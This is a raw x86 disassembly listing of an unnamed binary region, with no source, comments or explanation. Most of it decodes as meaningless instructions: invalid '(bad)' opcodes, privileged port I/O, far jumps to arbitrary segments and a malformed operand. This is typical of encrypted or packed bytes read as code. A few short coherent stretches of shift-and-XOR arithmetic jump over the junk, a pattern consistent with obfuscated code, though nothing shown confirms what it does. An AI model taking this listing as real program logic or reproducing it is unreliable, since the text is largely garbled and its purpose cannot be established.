  405552:	mov    BYTE PTR [esi],bl
  405554:	dec    esp
  405555:	mov    ds:0xbe1b9df1,eax
  40555a:	adc    bl,ch
  40555c:	jle    0x4055a2
  40555e:	sub    ah,ah
  405560:	inc    esi
  405561:	pop    ds
  405562:	retf   
  405563:	fiadd  WORD PTR [edi+0x55]
  405566:	dec    eax
  405567:	bound  ebp,QWORD PTR [edi+0x6a20e0f4]
  40556d:	es out 0x73,eax
  405570:	sub    DWORD PTR [ecx-0x6a],ebx
  405573:	xchg   ebp,eax
  405574:	rcr    DWORD PTR [edi+0xef43a39],cl
  40557a:	cmc    
  40557b:	push   esp
  40557c:	jmp    0x859c:0xf5c9180c
  405583:	js     0x4055e4
  405585:	neg    DWORD PTR cs:[eax-0x27892ed1]
  40558c:	fist   DWORD PTR [ebx-0x680b2f35]
  405592:	stc    
  405593:	xor    DWORD PTR [eax-0x4],ebp
  405596:	and    dl,BYTE PTR [ebx+0x4ce4ca6a]
  40559c:	jmp    0x3407:0xd48004b3
  4055a3:	sti    
  4055a4:	jb     0x4055d9
  4055a6:	je     0x40557e
  4055a8:	xchg   ebx,eax
  4055a9:	or     ebp,esp
  4055ab:	jle    0x40555e
  4055ad:	sar    DWORD PTR [edi-0x75],1
  4055b0:	loope  0x40556f
  4055b2:	xor    DWORD PTR [eax+ebp*4],0x42
  4055b6:	xchg   edx,eax
  4055b7:	or     bh,cl
  4055b9:	aaa    
  4055ba:	push   es
  4055bb:	or     al,0x38
  4055bd:	ffree  st(2)
  4055bf:	enter  0xb6fb,0x64
  4055c3:	mov    dh,0x3d
  4055c5:	xor    eax,0x3b1a2b85
  4055ca:	out    0xc5,eax
  4055cc:	fstp   TBYTE PTR [edi]
  4055ce:	(bad)  
  4055cf:	cld    
  4055d0:	inc    esi
  4055d1:	push   edx
  4055d2:	push   ss
  4055d3:	adc    esp,eax
  4055d5:	pop    ebp
  4055d6:	popa   
  4055d7:	dec    ebx
  4055d8:	dec    ebp
  4055d9:	dec    ebp
  4055da:	adc    DWORD PTR [ecx-0x79063543],ecx
  4055e0:	mov    ch,0xa5
  4055e2:	imul   ebx,DWORD PTR [ecx+0x2f],0x3047e6b4
  4055e9:	add    al,0x7e
  4055eb:	out    dx,eax
  4055ec:	xchg   ebp,eax
  4055ed:	jle    0x4055d3
  4055ef:	in     eax,0xb7
  4055f1:	cs mov eax,0xb589a8ee
  4055f7:	xlat   BYTE PTR ds:[ebx]
  4055f8:	sub    eax,0x4a72171e
  4055fd:	mov    cl,0x44
  4055ff:	adc    ebp,DWORD PTR [ebx]
  405601:	jecxz  0x405618
  405603:	and    edi,esi
  405605:	cld    
  405606:	imul   ebx,DWORD PTR [esi],0x66
  405609:	aas    
  40560a:	dec    esi
  40560b:	cs or  eax,0x7dca8868
  405611:	mov    ebx,DWORD PTR [edx+ecx*1]
  405614:	pop    edi
  405615:	mov    al,0xfc
  405617:	int3   
  405618:	or     eax,0x79865ff4
  40561d:	mov    ecx,DWORD PTR [ecx]
  40561f:	pop    edi
  405620:	mov    dl,0xb5
  405622:	ret    
  405623:	sbb    bh,BYTE PTR [edx+0x2d]
  405626:	fiadd  DWORD PTR [ebx]
  405628:	jne    0x4055dc
  40562a:	mov    bh,BYTE PTR [edi-0x6f]
  40562d:	add    bh,BYTE PTR [ebx+0x37]
  405630:	xor    dl,BYTE PTR [edx+0x0]
  405633:	aaa    
  405634:	adc    eax,0x79000db3
  405639:	fucom  st(0)
  40563b:	out    0xb5,al
  40563d:	xor    eax,0x9402b943
  405642:	push   eax
  405643:	shl    DWORD PTR [edi],cl
  405645:	jle    0x4055ea
  405647:	ins    DWORD PTR es:[edi],dx
  405648:	xor    esi,DWORD PTR [eax-0x4f7778aa]
  40564e:	imul   esi,DWORD PTR [edx-0x7],0x2797e2bb
  405655:	mov    dh,0x99
  405657:	or     bl,BYTE PTR ds:0x79c95a2
  40565d:	pop    edi
  40565e:	or     eax,0x44e4a7ca
  405663:	ds pusha 
  405665:	xchg   edi,eax
  405666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405668:	cmp    dh,BYTE PTR [ebp+ecx*2+0x5ce5ef4e]
  40566f:	aas    
  405670:	sbb    DWORD PTR [edx-0x4e],eax
  405673:	cld    
  405674:	adc    edx,DWORD PTR [edx]
  405676:	xor    cl,BYTE PTR [edx+0x27]
  405679:	adc    BYTE PTR [esi+0x7d],dh
  40567c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40567d:	fisubr DWORD PTR [eax+eax*2+0x60]
  405681:	ja     0x4056c5
  405683:	and    ch,BYTE PTR [ebx-0x3072aa93]
  405689:	mov    dh,0x30
  40568b:	adc    DWORD PTR [edi],edi
  40568d:	je     0x405627
  40568f:	imul   ecx,DWORD PTR [edi+0x19],0x197b497a
  405696:	pop    esi
  405697:	and    bh,dh
  405699:	into   
  40569a:	xchg   esp,eax
  40569b:	push   ss
  40569c:	fsubr  DWORD PTR [ecx]
  40569e:	ror    bl,cl
  4056a0:	jae    0x40570d
  4056a2:	sbb    bl,ch
  4056a4:	ret    0x4c0
  4056a7:	iret   
  4056a8:	stc    
  4056a9:	xlat   BYTE PTR ds:[ebx]
  4056aa:	inc    eax
  4056ab:	test   BYTE PTR [ecx],bh
  4056ad:	in     al,0x28
  4056af:	sub    bh,dl
  4056b1:	test   DWORD PTR [eax+ecx*8],eax
  4056b4:	pop    es
  4056b5:	mov    BYTE PTR [ecx-0x38],cl
  4056b8:	sbb    BYTE PTR [eax+0x0],0x7f
  4056bc:	jne    0x4056a4
  4056be:	popf   
  4056bf:	sub    edi,eax
  4056c1:	fucom  st(2)
  4056c3:	jg     0x40565b
  4056c5:	rcr    DWORD PTR [edx],cl
  4056c7:	pop    edx
  4056c8:	dec    edx
  4056c9:	jl     0x405716
  4056cb:	add    ecx,ebp
  4056cd:	scas   eax,DWORD PTR es:[edi]
  4056ce:	les    esi,FWORD PTR [edx-0x1b]
  4056d1:	xchg   edx,eax
  4056d2:	mov    ch,0xaa
  4056d4:	dec    edx
  4056d5:	enter  0x60d0,0x19
  4056d9:	or     eax,0x6c9ff741
  4056de:	daa    
  4056df:	mov    dh,0xe8
  4056e1:	test   DWORD PTR [ebx-0x9e0d331],ebp
  4056e7:	(bad)  [eax+0x50]
  4056ea:	out    dx,eax
  4056eb:	aad    0x9f
  4056ed:	inc    ebp
  4056ee:	push   edi
  4056ef:	jle    0x4056b7
  4056f1:	mov    DWORD PTR [eax-0x37],eax
  4056f4:	ror    DWORD PTR [ecx],1
  4056f6:	pusha  
  4056f7:	xchg   edi,eax
  4056f8:	je     0x405688
  4056fa:	cmp    BYTE PTR [edi],al
  4056fc:	inc    edx
  4056fd:	dec    edx
  4056fe:	xchg   edi,eax
  4056ff:	sub    esp,edi
  405701:	inc    ebx
  405702:	sti    
  405703:	stos   DWORD PTR es:[edi],eax
  405704:	add    al,0xb5
  405706:	fwait
  405707:	jbe    0x40577d
  405709:	dec    ebp
  40570a:	inc    ebp
  40570b:	(bad)  es:[ecx]
  40570e:	retf   
  40570f:	clc    
  405710:	inc    edi
  405711:	or     al,0xdd
  405713:	loop   0x4056dc
  405715:	ret    
  405716:	jp     0x405777
  405718:	jbe    0x40575e
  40571a:	pop    ds
  40571b:	add    BYTE PTR [esi+0x6c485212],0xff
  405722:	inc    DWORD PTR [ecx-0x1f4b4173]
  405728:	jbe    0x4056b6
  40572a:	(bad)  
  40572b:	in     eax,0x7e
  40572d:	push   ecx
  40572e:	bound  ebx,QWORD PTR [ebp-0x21784b25]
  405734:	xor    al,0x17
  405736:	mov    bl,BYTE PTR [esi+0x7beb609d]
  40573c:	int3   
  40573d:	jno    0x405763
  40573f:	xor    eax,0x657c4591
  405744:	hlt    
  405745:	jo     0x40578a
  405747:	sub    eax,0x4c4c6c35
  40574c:	xchg   ebx,eax
  40574d:	outs   dx,BYTE PTR ds:[esi]
  40574e:	test   DWORD PTR [eax+0x16],ebx
  405751:	test   eax,0xbca0a511
  405756:	inc    ebx
  405757:	mov    ds:0x47725dfc,al
  40575c:	xor    al,0xd2
  40575e:	dec    ebx
  40575f:	xor    bl,ah
  405761:	test   DWORD PTR [ecx],ebx
  405763:	sub    al,0xf0
  405765:	sub    DWORD PTR [esp+eax*2],edi
  405768:	mul    DWORD PTR [ecx]
  40576a:	js     0x40579b
  40576c:	inc    ebx
  40576d:	jle    0x405701
  40576f:	cmp    eax,0x287166c
  405774:	iret   
  405775:	add    edx,DWORD PTR ds:0x48bbb289
  40577b:	out    0xe7,eax
  40577d:	mov    ecx,0x14e1e19f
  405782:	xchg   esp,eax
  405783:	inc    ecx
  405784:	push   ecx
  405785:	retf   0xf1d3
  405788:	xchg   ebx,eax
  405789:	and    ch,BYTE PTR [edi]
  40578b:	xor    al,0xb
  40578d:	xor    ebx,eax
  40578f:	jo     0x405767
  405791:	mov    ecx,0xbaf7147a
  405796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405797:	arpl   cx,cx
  405799:	dec    ebx
  40579a:	mov    edi,0xadabed09
  40579f:	movaps xmm0,XMMWORD PTR [eax-0x4306183e]
  4057a6:	xchg   ebp,eax
  4057a7:	dec    ecx
  4057a8:	outs   dx,BYTE PTR ds:[esi]
  4057a9:	fwait
  4057aa:	dec    edi
  4057ab:	(bad)  
  4057ac:	adc    edi,DWORD PTR [edx+0x72]
  4057af:	adc    ebx,edi
  4057b1:	xor    cl,BYTE PTR [ebx-0x7069291]
  4057b7:	cmp    ch,BYTE PTR [edx]
  4057b9:	cmp    DWORD PTR [eax],0xe5c61ef0
  4057bf:	pop    edx
  4057c0:	xchg   edi,eax
  4057c1:	ror    DWORD PTR [esi],0xc2
  4057c4:	es mov ebx,0x725b7f77
  4057ca:	retf   0xa116
  4057cd:	dec    ebx
  4057ce:	push   ebx
  4057cf:	pop    ds
  4057d0:	dec    edi
  4057d1:	cdq    
  4057d2:	adc    DWORD PTR [eax+0x27],0x1b
  4057d6:	icebp  
  4057d7:	(bad)  
  4057d8:	in     al,dx
  4057d9:	xlat   BYTE PTR ds:[ebx]
  4057da:	lds    ecx,FWORD PTR ds:[edx]
  4057dd:	dec    ecx
  4057de:	jae    0x405820
  4057e0:	push   ss
  4057e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057e2:	jnp    0x4057d3
  4057e4:	jecxz  0x40583a
  4057e6:	and    eax,0xb1e78474
  4057eb:	lds    esi,FWORD PTR [edx+0x5f]
  4057ee:	xor    DWORD PTR fs:[ecx-0xf904812],eax
  4057f5:	in     eax,dx
  4057f6:	imul   ebp,DWORD PTR [esi-0x5c],0x88841649
  4057fd:	jecxz  0x405871
  4057ff:	sub    DWORD PTR [eax+edi*4-0x4e021735],eax
  405806:	pop    ecx
  405807:	and    al,0xc2
  405809:	push   ecx
  40580a:	aaa    
  40580b:	jg     0x4057fc
  40580d:	mov    eax,0x536ce402
  405812:	or     al,BYTE PTR [esi+0xc]
  405815:	mov    ah,0x6c
  405817:	(bad)  
  405818:	jmp    0x40585c
  40581a:	test   BYTE PTR [ebp+0x9],dh
  40581d:	retf   
  40581e:	fs add eax,0x14d6ce3b
  405824:	gs sub eax,0xe4d413c
  40582a:	cld    
  40582b:	mov    ch,0xb3
  40582d:	xchg   DWORD PTR [eax+0x8a0d15f],edi
  405833:	das    
  405834:	xchg   esp,eax
  405835:	addr16 into 
  405837:	pop    ebx
  405838:	push   cs
  405839:	dec    esp
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x42834b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428137,0x0
  40584d:	mov    DWORD PTR ds:0x428227,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428227,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428137,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e34
  40588d:	adc    DWORD PTR ds:0x4282cb,edx
  405893:	or     DWORD PTR ds:0x4281fb,0x369f
  40589d:	neg    DWORD PTR ds:0x42813b
  4058a3:	sub    DWORD PTR ds:0x42811b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x4058da
  405910:	inc    esp
  405911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405912:	mov    esp,0x1818b16d
  405917:	sahf   
  405918:	adc    bl,BYTE PTR [eax]
  40591a:	sbb    BYTE PTR [ecx-0x7d1ec14f],bh
  405920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405921:	stc    
  405922:	xchg   edx,eax
  405923:	in     al,dx
  405924:	or     BYTE PTR [ebp-0x5fe8ae19],0x33
  40592b:	sub    ah,al
  40592d:	jnp    0x405909
  40592f:	sbb    dl,dl
  405931:	add    edx,DWORD PTR [edx-0x20]
  405934:	xor    al,0x87
  405936:	leave  
  405937:	jae    0x4058d4
  405939:	out    0x98,eax
  40593b:	in     al,dx
  40593c:	icebp  
  40593d:	and    DWORD PTR [ecx+0x1a670fc4],edx
  405943:	inc    ebp
  405944:	sbb    ah,bl
  405946:	mov    ebp,0x1bf1fdac
  40594b:	mov    bl,0x52
  40594d:	jae    0x405920
  40594f:	fcomp  DWORD PTR [ebp+0xc]
  405952:	mov    WORD PTR es:[ecx+ebp*1+0x5f],gs
  405957:	xchg   esp,eax
  405958:	xor    cl,dh
  40595a:	jnp    0x40590a
  40595c:	add    DWORD PTR [edx],ebx
  40595e:	dec    esp
  40595f:	cmp    ebp,DWORD PTR [ecx]
  405961:	push   ds
  405962:	lahf   
  405963:	sub    eax,0xd4e2fc71
  405968:	mov    al,ds:0xbb3bd1e9
  40596d:	sahf   
  40596e:	or     bh,BYTE PTR ds:0xe613e42a
  405974:	pop    ds
  405975:	or     al,0xd5
  405977:	inc    edi
  405978:	sbb    bl,BYTE PTR [eax+0x32]
  40597b:	cld    
  40597c:	xchg   ebx,eax
  40597d:	lds    eax,FWORD PTR [eax]
  40597f:	ror    DWORD PTR [esp+ebx*2+0x72b882e6],0x3f
  405987:	pusha  
  405988:	sub    dl,0xfa
  40598b:	clc    
  40598c:	sti    
  40598d:	fs std 
  40598f:	pop    ds
  405990:	xor    ch,al
  405992:	sbb    al,0xe1
  405994:	mov    dh,BYTE PTR [edi-0x7b]
  405997:	mov    edx,DWORD PTR [ecx-0x54931215]
  40599d:	push   ss
  40599e:	cmp    eax,0x119d5708
  4059a3:	pop    edx
  4059a4:	je     0x405a0e
  4059a6:	xor    ah,ch
  4059a8:	add    ebp,DWORD PTR [edi+0x3e]
  4059ab:	(bad)  
  4059ad:	pop    DWORD PTR [eax+0x16]
  4059b0:	pop    ebp
  4059b1:	(bad)  
  4059b2:	xchg   esi,eax
  4059b3:	dec    esi
  4059b4:	in     al,0x64
  4059b6:	xor    eax,0xf44c2d4f
  4059bb:	imul   esp,DWORD PTR [ebx+0x4f],0x22b84d51
  4059c2:	mov    edx,0x1794a60d
  4059c7:	outs   dx,BYTE PTR ds:[esi]
  4059c8:	stc    
  4059c9:	out    dx,al
  4059ca:	cli    
  4059cb:	loopne 0x405998
  4059cd:	call   0xfd88658c
  4059d2:	fcmove st,st(6)
  4059d4:	jmp    0x316b152a
  4059d9:	ins    BYTE PTR es:[edi],dx
  4059da:	test   al,0xcf
  4059dc:	cmp    ch,dl
  4059de:	adc    DWORD PTR [edx+0x2ec961d0],ebx
  4059e4:	jmp    0x1b84:0x49ddaf48
  4059eb:	jo     0x405a10
  4059ed:	mov    edx,0x32a30ad9
  4059f2:	icebp  
  4059f3:	call   0x79ac0f0f
  4059f8:	mov    al,0x4f
  4059fa:	or     eax,0x23d4d87
  4059ff:	outs   dx,DWORD PTR ds:[esi]
  405a00:	or     esp,DWORD PTR [eax-0x56044d8c]
  405a06:	gs stos BYTE PTR es:[edi],al
  405a08:	outs   dx,BYTE PTR ds:[esi]
  405a09:	xor    bh,ch
  405a0b:	dec    edi
  405a0c:	sti    
  405a0d:	ja     0x405a50
  405a0f:	nop
  405a10:	jmp    0xde03853b
  405a15:	xchg   ebx,eax
  405a16:	(bad)  
  405a17:	adc    ebp,DWORD PTR [ecx-0x13]
  405a1a:	jecxz  0x4059f9
  405a1c:	adc    BYTE PTR [edi],al
  405a1e:	xor    esi,ebx
  405a20:	sbb    ebp,eax
  405a22:	mov    edx,0x8c162c38
  405a27:	lea    esp,[ecx]
  405a29:	dec    ecx
  405a2a:	(bad)  
  405a2b:	fiadd  DWORD PTR [edi+0x43806b36]
  405a31:	jmp    0x9a3a:0xc063a17e
  405a38:	and    eax,0x927a9a99
  405a3d:	test   DWORD PTR [eax],0x1fc7956
  405a43:	out    dx,eax
  405a44:	pusha  
  405a45:	push   ds
  405a46:	mov    cl,0x92
  405a48:	push   esi
  405a49:	iret   
  405a4a:	in     eax,0x3c
  405a4c:	and    eax,0xbbda3b6d
  405a51:	sbb    al,0xc8
  405a53:	and    DWORD PTR [eax-0x7f601c02],esi
  405a59:	fcomp  QWORD PTR [esi-0x1e39ea11]
  405a5f:	push   0x4096a39b
  405a64:	xchg   edi,eax
  405a65:	fwait
  405a66:	stos   DWORD PTR es:[edi],eax
  405a67:	fs rdpmc 
  405a6a:	mov    edx,DWORD PTR [edx-0x2]
  405a6d:	cmp    ebx,0x3a
  405a70:	ins    BYTE PTR es:[edi],dx
  405a71:	popa   
  405a72:	mov    bh,BYTE PTR [edi+0x49b19178]
  405a78:	arpl   WORD PTR [eax+0x588c97dc],ax
  405a7e:	retf   0x66e6
  405a81:	lods   eax,DWORD PTR ds:[esi]
  405a82:	lahf   
  405a83:	fadd   QWORD PTR [eax-0x5]
  405a86:	lods   eax,DWORD PTR ds:[esi]
  405a87:	dec    ebp
  405a88:	cli    
  405a89:	dec    DWORD PTR [ecx-0x4c]
  405a8c:	std    
  405a8d:	inc    ebx
  405a8e:	imul   eax,eax,0x17
  405a91:	rcr    BYTE PTR [edx+edx*2],0xd0
  405a95:	cmp    al,ah
  405a97:	xchg   ecx,eax
  405a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a99:	cwde   
  405a9a:	out    dx,eax
  405a9b:	lods   eax,DWORD PTR ds:[esi]
  405a9c:	jp     0x405ac4
  405a9e:	mov    ebp,0xe932d2fd
  405aa3:	and    BYTE PTR ds:0xd76d94e3,dh
  405aa9:	mov    ebx,0xfd6d24b4
  405aae:	adc    al,0x69
  405ab0:	push   esi
  405ab1:	jecxz  0x405ac4
  405ab3:	xchg   ebx,eax
  405ab4:	mov    ah,0xb6
  405ab6:	cmp    esi,ecx
  405ab8:	mov    ch,0x92
  405aba:	dec    DWORD PTR [edx-0x49674617]
  405ac0:	pop    ecx
  405ac1:	inc    esi
  405ac2:	fidiv  WORD PTR [ecx-0x11]
  405ac5:	and    al,0x9d
  405ac7:	daa    
  405ac8:	push   edx
  405ac9:	std    
  405aca:	cs jns 0x405ab3
  405acd:	jo     0x405b29
  405acf:	adc    esp,DWORD PTR [ebp+0x21]
  405ad2:	add    DWORD PTR [ecx],ecx
  405ad4:	ss in  al,dx
  405ad6:	out    0x4,eax
  405ad8:	pusha  
  405ad9:	xchg   ebp,eax
  405ada:	pop    ss
  405adb:	cld    
  405adc:	gs jg  0x405ae0
  405adf:	xchg   esi,eax
  405ae0:	jmp    0xa867:0x18fffdf
  405ae7:	sub    al,0x78
  405ae9:	ss jnp 0x405aed
  405aec:	or     dh,bh
  405aee:	jge    0x405af4
  405af0:	imul   ebx,DWORD PTR [ebx],0x66a7549f
  405af6:	repnz in al,0xf4
  405af9:	jmp    0x46dc:0x9d831b0e
  405b00:	dec    ebp
  405b01:	(bad)  
  405b02:	mov    bh,0x68
  405b04:	mov    dh,0x4c
  405b06:	and    al,0x16
  405b08:	fisubr DWORD PTR [esi+0x6f782603]
  405b0e:	int3   
  405b0f:	les    esi,FWORD PTR [ebp-0x51bbad92]
  405b15:	icebp  
  405b16:	mov    bh,0xf1
  405b18:	inc    edi
  405b19:	sub    eax,0xfbe58a1f
  405b1e:	jge    0x405b2c
  405b20:	mov    bh,0xe2
  405b22:	dec    edi
  405b23:	data16 cmc 
  405b25:	xor    eax,edi
  405b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b28:	pop    es
  405b29:	xor    BYTE PTR [eiz*1-0x27ecbdee],bl
  405b30:	pop    ebx
  405b31:	ja     0x405b41
  405b33:	repnz xchg edx,eax
  405b35:	(bad)  
  405b36:	es inc ecx
  405b38:	dec    esi
  405b39:	push   es
  405b3a:	sub    eax,0xc1b5ee2d
  405b3f:	add    al,0x65
  405b41:	lock adc al,0x42
  405b44:	sbb    ch,dl
  405b46:	nop    DWORD PTR [ecx-0x79]
  405b4a:	pop    ss
  405b4b:	push   ebp
  405b4c:	jp     0x405ade
  405b4e:	les    ebx,FWORD PTR [eax]
  405b50:	into   
  405b51:	sbb    ebx,esi
  405b53:	rcr    DWORD PTR [edi+0x456df33e],cl
  405b59:	fld    DWORD PTR [ebp-0x1001d3c0]
  405b5f:	jne    0x405b39
  405b61:	sbb    al,0x34
  405b63:	adc    esp,DWORD PTR [ecx-0x73a34846]
  405b69:	fbstp  TBYTE PTR [eax]
  405b6b:	iret   
  405b6c:	jns    0x405b01
  405b6e:	mov    bh,0xd4
  405b70:	push   ss
  405b71:	into   
  405b72:	repnz lds esi,FWORD PTR [ebp+0x2d22afa1]
  405b79:	mov    cl,0x70
  405b7b:	test   DWORD PTR [ecx],edx
  405b7d:	add    eax,0x1925145c
  405b82:	push   ss
  405b83:	sbb    al,0x28
  405b85:	call   0xf54f:0x7202867b
  405b8c:	loopne 0x405b5c
  405b8e:	stc    
  405b8f:	in     al,0x58
  405b91:	repz dec edi
  405b93:	sub    DWORD PTR [ebx],edx
  405b95:	mov    edi,0x63abebbc
  405b9a:	or     DWORD PTR [ebp+esi*8+0x2e],esi
  405b9e:	sti    
  405b9f:	adc    esp,edx
  405ba1:	push   ebp
  405ba2:	retf   
  405ba3:	sub    ch,0x61
  405ba6:	push   ebx
  405ba7:	xchg   ecx,eax
  405ba8:	retf   0x9287
  405bab:	icebp  
  405bac:	bound  esp,QWORD PTR [ebx-0x23]
  405baf:	push   ecx
  405bb0:	jp     0x405c08
  405bb2:	jne    0x405c05
  405bb4:	and    esi,DWORD PTR [edx+0x2abe4af6]
  405bba:	mov    ch,0x8
  405bbc:	xor    esi,DWORD PTR [ecx+0x46]
  405bbf:	dec    esi
  405bc0:	sahf   
  405bc1:	xlat   BYTE PTR ds:[ebx]
  405bc2:	dec    ebx
  405bc3:	ins    DWORD PTR es:[edi],dx
  405bc4:	mov    eax,0x99cfd86
  405bc9:	sbb    eax,0xbb05fb90
  405bce:	push   0x4afbdcfe
  405bd3:	cmp    BYTE PTR [edi+0x5b4ea32b],cl
  405bd9:	fst    DWORD PTR [ecx-0x645d37ad]
  405bdf:	into   
  405be0:	popf   
  405be1:	add    bh,BYTE PTR [ebx-0x6b]
  405be4:	and    bl,BYTE PTR [edx+0x555d51ff]
  405bea:	add    BYTE PTR [edi],bl
  405bec:	or     eax,0x522c1a5e
  405bf1:	add    al,0xf6
  405bf3:	xchg   ecx,eax
  405bf4:	pop    ss
  405bf5:	imul   ebp,DWORD PTR [edi+ebp*8+0x2b],0x9dfaf9ff
  405bfd:	fiadd  DWORD PTR [edi+0x50]
  405c00:	mov    dl,0x1e
  405c02:	(bad)
  405c05:	jge    0x405c2f
  405c07:	cld    
  405c08:	mov    ds:0x32054b36,al
  405c0d:	mov    cs,WORD PTR [ebp+0x744423f8]
  405c13:	test   eax,0x4ae6e948
  405c18:	addr16 inc eax
  405c1a:	ins    BYTE PTR es:[edi],dx
  405c1b:	retf   
  405c1c:	inc    esp
  405c1d:	xor    BYTE PTR [edx+ebx*2+0x43e22f03],bh
  405c24:	sbb    BYTE PTR ds:0x3b6ced31,ah
  405c2a:	neg    ch
  405c2c:	lahf   
  405c2d:	mov    ?,WORD PTR [eax-0x75]
  405c30:	stos   DWORD PTR es:[edi],eax
  405c31:	inc    eax
  405c32:	stc    
  405c33:	mov    ds:0xc6d2a3c6,eax
  405c38:	pop    ds
  405c39:	sbb    dh,BYTE PTR [edx+eiz*8-0x1af2aa00]
  405c40:	sub    BYTE PTR [ecx+0x12],cl
  405c43:	call   0x6d40:0x8d318f58
  405c4a:	dec    eax
  405c4b:	jle    0x405cbe
  405c4d:	out    0x5d,eax
  405c4f:	xor    eax,0xf22662af
  405c54:	mov    ds:0xc27f7a1,al
  405c59:	dec    bl
  405c5b:	retf   
  405c5c:	(bad)  
  405c5e:	std    
  405c5f:	jnp    0x405cb9
  405c61:	sar    BYTE PTR [esi+0xb],cl
  405c64:	fwait
  405c65:	shl    BYTE PTR [esi+0x50898f42],1
  405c6b:	and    edx,DWORD PTR [eax+0x344584bd]
  405c71:	popf   
  405c72:	aaa    
  405c73:	push   es
  405c74:	jb     0x405c4d
  405c76:	(bad)  
  405c78:	cwde   
  405c79:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c7b:	call   0xeccc:0x64591084
  405c82:	and    eax,0xc05d4de3
  405c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c88:	repz dec esp
  405c8a:	jg     0x405cdf
  405c8c:	adc    ah,BYTE PTR [ebx]
  405c8e:	pop    eax
  405c8f:	loop   0x405cfd
  405c91:	or     al,0x8b
  405c93:	addr16 push es
  405c95:	aas    
  405c96:	cmp    BYTE PTR [edx+0x56a2f539],bh
  405c9c:	es xor eax,0x6baee9d6
  405ca2:	adc    esp,DWORD PTR cs:[ecx-0x65a2f094]
  405ca9:	imul   ecx,DWORD PTR [edx-0x6a4e7e06],0x1e6e8f56
  405cb3:	sub    al,0x2e
  405cb5:	mov    ch,0x4a
  405cb7:	fucomip st,st(6)
  405cb9:	jno    0x405c41
  405cbb:	add    DWORD PTR [ecx+0x48334689],ebx
  405cc1:	repz push 0xdc08f176
  405cc7:	mov    esi,0x45801972
  405ccc:	lea    esp,[eax+0x76]
  405ccf:	add    al,0x8
  405cd1:	cmp    al,0xc5
  405cd3:	jl     0x405c58
  405cd5:	mov    edi,0x72f7037f
  405cda:	test   eax,0xd445898c
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x67],1
  405d2b:	and    DWORD PTR [ebp+0x70],ebx
  405d2e:	repnz test eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	xchg   BYTE PTR [ebx],bh
  405d38:	sbb    ebp,DWORD PTR [esi]
  405d3a:	scas   al,BYTE PTR es:[edi]
  405d3b:	dec    esi
  405d3c:	xor    al,0x69
  405d3e:	and    edx,DWORD PTR [edx+0x7b]
  405d41:	lods   eax,DWORD PTR ds:[esi]
  405d42:	mov    bl,0xb5
  405d44:	push   ebp
  405d45:	arpl   WORD PTR [eax],dx
  405d47:	inc    ebx
  405d48:	or     BYTE PTR [ebx],bl
  405d4a:	add    eax,0x4327e6cf
  405d4f:	test   eax,0x112e80c1
  405d54:	int    0x87
